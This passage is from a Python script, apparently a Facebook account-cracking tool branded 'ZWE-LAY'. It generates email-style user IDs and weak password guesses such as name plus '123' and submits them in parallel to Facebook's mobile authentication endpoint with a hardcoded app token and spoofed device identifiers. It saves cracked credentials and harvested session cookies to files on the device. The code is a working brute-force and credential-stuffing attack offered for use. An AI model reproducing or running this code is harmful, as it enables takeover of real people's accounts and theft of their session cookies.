                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mTOTAL ID        \033[1;32m║ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mCRACK NAME      \033[1;32m║ \033[1;32m'+first+'')
                        print(f"  \033[1;32m〘\033[1;97m✔\033[1;32m〙\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=first+'.'+digitx+domain
                                pwx=[digitx+first,first+digitx,first,first+'123',first+'1234',first+'12345',first+'@123',first+'1122']
                                LEE.submit(rcrack,uid,pwx,tl)                                

#ua_string="[FBAN/Orca-Android;FBAV/"+str(random.choice(range(100,300)))+".0.0.29."+str(random.choice(range(100,300)))+";FBPN/com.facebook.orca;FBLC/th_TH;FBBV/"+str(random.choice(range(100999999,300999999)))+";FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"

def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\r \033[1;32m〘%sZWE-LAY\033[1;32m〙\033[1;34m\033[1;32m〘\033[38;5;195m%s/%s\033[1;32m〙\033[1;32mOK-%s\r'      %    (bi,loop,tl,len(oks)))
            sys.stdout.flush()
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,
            'password': ps,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_GB',
            'client_country_code': 'GB',
            'fb_api_req_friendly_name': 'authenticate'}
            head={
            'User-Agent': uaa(),
            'Accept-Encoding':  'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url1= 'https://b-graph.facebook.com/auth/login'
            lo=session.post(url1,data=data,headers=head).json()
            if 'session_key' in lo:
                coki=";".join(i["name"]+"="+i["value"] for i in lo["session_cookies"])	
                print(f"\033[1;32m  〘✔〙{uid} ※ {ps} " '  \n\033[1;36m〘COOKIE〙 = '+coki+  '')
                linex()
                open('/sdcard/ZWE-LAY-OK.txt', 'a').write( uid+' | '+ps+'\nCookie = '+coki+'\n\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in str(lo):            	
                print(f"\x1b[1;90m  〘UID〙= {uid} ")
                print(f"\x1b[1;90m  〘PAS〙= {ps} ")
                #print(f"\x1b[1;93m  〘USER-AGENT〙{pro} ")
                open('/sdcard/ZWE-LAY-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1 
        sys.stdout.write(f'\r\r \033[1;32m〘%sZWE-LAY\033[1;32m〙\033[1;34m\033[1;32m〘\033[38;5;195m%s/%s\033[1;32m〙\033[1;32mOK-%s\r'    %  (bi,loop,tl,len(oks)))
        sys.stdout.flush()
    except:
        pass
main()        
        